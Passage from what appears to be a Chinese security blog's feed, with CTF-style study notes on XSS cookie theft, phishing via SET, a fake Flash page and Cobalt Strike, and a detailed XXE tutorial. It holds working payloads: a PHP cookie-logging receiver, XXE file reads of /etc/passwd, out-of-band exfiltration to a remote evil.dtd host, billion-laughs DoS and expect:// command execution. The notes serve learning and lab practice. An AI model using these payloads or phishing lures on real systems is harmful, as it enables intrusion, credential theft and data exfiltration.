data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure></div><p>也可以在服务区上写个php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span> (<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&quot;IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;Date: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot; Cookie:&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure></div></blockquote><h3 id="SET钓鱼"><a href="#SET钓鱼" class="headerlink" title="SET钓鱼"></a>SET钓鱼</h3><p>set工具生成与后台页面相同网页，诱导管理员点击</p><p>可以直接用XSS的链接跳转</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://10.20.25.39/&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>mac终端使用setoolkit，运行</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">social-engineer-toolkit  </span><br><span class="line">sudo setoolkit</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h3><p>模仿的 Flash Player 中文官网的页面</p><p><a href="https://image.3001.net/images/20201029/16039798083018.png"><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q3ghe79bj31dv0u0jub.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></a></p><blockquote><p>点击会下载准备好的CS马</p></blockquote><h3 id="CS钓鱼"><a href="#CS钓鱼" class="headerlink" title="CS钓鱼"></a>CS钓鱼</h3><p> Cobalt Strike 也是可以轻松构建出一个钓鱼网站的，操作也比较简单：</p><p>「攻击」-「钓鱼攻击」-「克隆网站」：</p><p><a href="https://image.3001.net/images/20201031/1604132838976.png"><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1h6q3lqohldj30ey0c6gmj.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></a></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q3m2lj0dj311e0u0wi8.jpg"                      alt="image-20221001211618566"                ><figcaption>image-20221001211618566</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习</title>
      <link href="/2022/04/22/XXE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/22/XXE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE全称XML External Entity InjectionXML在引入外部实体的时候完成注入攻击称为XXE。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="XML语言"><a href="#XML语言" class="headerlink" title="XML语言"></a>XML语言</h3><p>XML是一种用来传输和存储数据的可扩展标记语言。</p><p>XML用于<strong>传输和数据存储</strong>。HTML用于显示数据</p><p>语法规则</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.所有的XML元素都必须有一个关闭标签  e.g. &lt;note&gt; &lt;/note&gt;</span><br><span class="line">2.XML标签对大小写敏感</span><br><span class="line">3.XML必须正确嵌套</span><br><span class="line">4.XML属性值必须加引号&quot;&quot;</span><br><span class="line">5.实体引用：在标签属性，或者对应位置值可能出现&lt;&gt;符号，这些在对应的xml中都是特殊含义的，那么必须使用对应html的实体对应的表示:例如，&lt;message&gt;if salary &lt; 1000 then &lt;/message&gt;如果把这个“&lt;”放在元素中，那么解析器会把他当成新元素的开始，就会发生报错。为了避免这个错误使用实体引用来代替&lt;message&gt;if salary &amp;lt; 1000 then &lt;/message&gt;</span><br></pre></td></tr></table></figure></div><p><strong>xml结构</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XML 文档声明，在文档的第一行</span><br><span class="line">XML 文档类型定义，即DTD，XXE 漏洞所在的地方</span><br><span class="line">XML 文档元素</span><br></pre></td></tr></table></figure></div><blockquote><p>根据 DOM，XML 文档中的每个成分都是一个<strong>节点</strong>。</p><p>DOM 是这样规定的：</p><ul><li>整个文档是一个文档节点</li><li>每个 XML 标签是一个元素节点</li><li>包含在 XML 元素中的文本是文本节点</li><li>每一个 XML 属性是一个属性节点</li><li>注释属于注释节点</li></ul><p><u>*<year>2005</year>*，元素节点 <year>，拥有一个值为 “2005” 的文本节点。”2005” <em>不是</em> <year> 元素的值！</u></p></blockquote><h3 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a><strong>XML DTD</strong></h3><p>1、文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>2、DTD 可被成行地声明于 XML 文档中，也可作为一个<strong>外部引用</strong>。</p><blockquote><p> 第二条是重点，也是XXE漏洞产生的原因，DTD可以<strong>定义外部实体并引用</strong></p></blockquote><p><strong>内部声明DTD</strong></p><p>若DTD要在XML文档中使用，他需要包含在·DOCTYPE声明中</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--xml声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">playwin</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;playwin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resume</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> <span class="symbol">&amp;name;</span> <span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resume</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><ul><li>DOCTYPE声明语法 <code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>实体引用：<code>&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</code></li><li>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 ( ; )。</li><li>声明 name 的值为 playwin ，下面引用 &amp;name；xml会自动解析为他的值，如果有的话，否则报错</li></ul></blockquote><p><strong>外部声明DTD</strong></p><p>声明外部实体(外部实体不是xml本身已定义的实体)</p><p>语法</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名字 <span class="keyword">SYSTEM</span> <span class="string">&quot;URL&quot;</span>&gt;</span>  <span class="comment">&lt;!--可以使用协议读取外部数据--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名字 <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URL&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///Users/sloth/1.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>案例</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">name</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">hack3r</span> <span class="string">&quot;http://www.chenguanxin.com&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;hack3r;<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><ul><li>外部声明实体外部实体用来引用外部资源,有两个关键字<code>SYSTEM</code>和<code>PUBLIC</code>两个,表示实体来自本地计算机还是公共计算机</li><li>根据不同环境不同协议读取外部数据</li><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003178.jpg"                      alt="sß"                ><figcaption>sß</figcaption></figure></li></ul></blockquote><p><strong>实体的嵌套</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt; &lt;!--内部--&gt;</span><br><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt; &lt;!--外部--&gt;</span><br></pre></td></tr></table></figure></div><p>实例:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>DOCTYPE前要紧跟!</p></blockquote><p>而里面引用的外部实体evil.dtd的内容:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file://文件路径&quot; &gt;</span><br></pre></td></tr></table></figure></div><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>前提：</p><p>Content-Type: application&#x2F;xml</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>file_get_contents()</code>:把整个文件读入一个字符串中。</p><p><code>libxml_disable_entity_loader(false)</code>：意思就是不禁止外部实体加载</p><p><code>loadXML( string $source, int $options = 0 )</code>: $source：此参数保存包含 XML 文档的字符串。$options：此参数保存 libxml 选项常量的按位或。返回值：此函数在成功时返回 TRUE，在失败时返回 FALSE。如果静态调用此函数，则返回 DOMDocument，失败时返回 FALSE。</p><blockquote><p>LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值</p><p>LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</p><h3 id="libxml选项常量"><a href="#libxml选项常量" class="headerlink" title="libxml选项常量"></a>libxml选项常量</h3><table><thead><tr><th>名称</th><th>描述</th><th>PHP</th></tr></thead><tbody><tr><td>LIBXML_COMPACT</td><td>设置小型节点分配优化。会改善应用程序的性能。</td><td>5</td></tr><tr><td>LIBXML_DTDATTR</td><td>设置默认 DTD 属性。</td><td>5</td></tr><tr><td>LIBXML_DTDLOAD</td><td>加载外部子集。</td><td>5</td></tr><tr><td>LIBXML_DTDVALID</td><td>通过 DTD 进行验证。</td><td>5</td></tr><tr><td>LIBXML_NOBLANKS</td><td>删除空节点。</td><td>5</td></tr><tr><td>LIBXML_NOCDATA</td><td>把 CDATA 设置为文本节点。</td><td>5</td></tr><tr><td>LIBXML_NOEMPTYTAG</td><td>更改空标签（比如 <br/> 改为 <br></br>）。仅在 DOMDocument-&gt;save() 和 DOMDocument-&gt;saveXML() 函数中可用。</td><td>5</td></tr><tr><td>LIBXML_NOENT</td><td>替代实体。</td><td>5</td></tr><tr><td>LIBXML_NOERROR</td><td>不显示错误报告。</td><td>5</td></tr><tr><td>LIBXML_NONET</td><td>在加载文档时停止网络访问。</td><td>5</td></tr><tr><td>LIBXML_NOWARNING</td><td>不显示警告报告。</td><td>5</td></tr><tr><td>LIBXML_NOXMLDECL</td><td>在保存文档时，撤销 XML 声明。</td><td>5</td></tr><tr><td>LIBXML_NSCLEAN</td><td>删除额外的命名空间声明。</td><td>5</td></tr><tr><td>LIBXML_XINCLUDE</td><td>使用 XInclude 置换。</td><td>5</td></tr><tr><td>LIBXML_ERR_ERROR</td><td>获得可恢复的错误。</td><td>5</td></tr><tr><td>LIBXML_ERR_FATAL</td><td>获得致命的错误。</td><td>5</td></tr><tr><td>LIBXML_ERR_NONE</td><td>获得无错误。</td><td>5</td></tr><tr><td>LIBXML_ERR_WARNING</td><td>获得简单警告。</td><td>5</td></tr><tr><td>LIBXML_VERSION</td><td>获得 Libxml 版本（例如：20605 或 20617）Get libxml version (e.g. 20605 or 20617)</td><td>5</td></tr><tr><td>LIBXML_DOTTED_VERSION</td><td>获得有点号的 Libxml 版本（例如：2.6.5 或 2.6.17）。</td><td>5</td></tr></tbody></table></blockquote><h3 id="利用file协议读取本地文件"><a href="#利用file协议读取本地文件" class="headerlink" title="利用file协议读取本地文件"></a>利用file协议读取本地文件</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="不回显漏洞信息外带信息"><a href="#不回显漏洞信息外带信息" class="headerlink" title="不回显漏洞信息外带信息"></a>不回显漏洞信息外带信息</h3><p>test.xml(靶场需要传输的xml文件)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://靶机ip/e.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div><p>e.dtd</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file://读取文件路径&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://靶机IP:监听端口/?p=%file;&#x27;&gt;&quot;&gt;  &lt;!--`&amp;#x25;`显示为`%`--&gt;</span><br></pre></td></tr></table></figure></div><p>在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错<br>在 外部DTD 文件中，参数实体的声明才能引用其他实体</p><ul><li><p>%remote调用e.dtd  </p></li><li><p>%int加载了file，%file获取了flag文件内容</p></li><li><p>%send将数据发送到靶机上</p></li></ul><p>%不允许出现在 Entity的value中，所以需要将%进行Unicode编码为 % 或者 %(转化成Unicode编码有两种形式，以&amp;#后接十进制数字，&amp;#x后接十六进制数字)</p><p>使用本地php_xxe靶场,发送以下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://124.223.207.184/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>操作过程：</p><ul><li><p>在自己的vps或云服务器上先搭建站点（使用宝塔面板搭建php站点，端口任意，可以是默认80,域名写:公网ip:端口）</p></li><li><p>登录云服务器 腾讯云下目录为 &#x2F;www&#x2F;wwwroot&#x2F;公网ip 在里面vim一个e.dtd，输入上述payload</p></li><li><p>注意选择监听端口，选择比较偏的，没有服务运行的，比如2333，然后要在云服务器控制台和宝塔都放行该端口，防火墙可关可不关</p></li><li><p>云服务器执行监听2333端口:<code>nc -lvvp 2333</code></p></li><li><p>本机靶场上发送构造的xml文件，云服务器端会回显file参数实体内容，即<code>php://filter/read=convert.base64-encode/resource=file://读取文件路径</code></p><p>⚠️踩过的坑：在日志中查看回显，服务器日志(80端口)，但携带flag的http请求是访问3344端口的</p></li></ul></blockquote><h3 id="报错输出"><a href="#报错输出" class="headerlink" title="报错输出"></a>报错输出</h3><p>环境：</p><ul><li>libxml&lt;&#x3D;2.8(2.9以后默认不使用外部实体)</li><li>开启了报错</li><li>无回显</li></ul><p>payload1</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; b &quot;</span><br><span class="line">&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span><br><span class="line">&gt;</span><br><span class="line">&quot;&gt;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%a;</span><br><span class="line">%b;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;asfddasfd&lt;/message&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>nonexistent可替换成任意根目录下不存在的文件夹名称，这也是报错的原因：读取了不存在文件</p><p>file参数实体内容即为想读取的文件内容</p><p><code>&amp;#x27;</code> : <code>&#39;</code></p><p><code>&amp;#x25;</code> :<code>%</code></p><p><code>&amp;#x26;</code> :<code>&amp;</code></p></blockquote><p>payload2</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % condition &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">    %condition;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;any text&lt;/message&gt;</span><br></pre></td></tr></table></figure></div><h3 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a><strong>DDos</strong></h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;abc&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”abc”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p><h4 id="PHP-expect-RCE"><a href="#PHP-expect-RCE" class="headerlink" title=".PHP expect RCE"></a><strong>.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p><p><strong>示例代码：</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></table></figure></div><h3 id="HTTP-内网主机探测"><a href="#HTTP-内网主机探测" class="headerlink" title="HTTP 内网主机探测"></a><strong>HTTP 内网主机探测</strong></h3><p>探测脚本</p><div class="highlight-container" 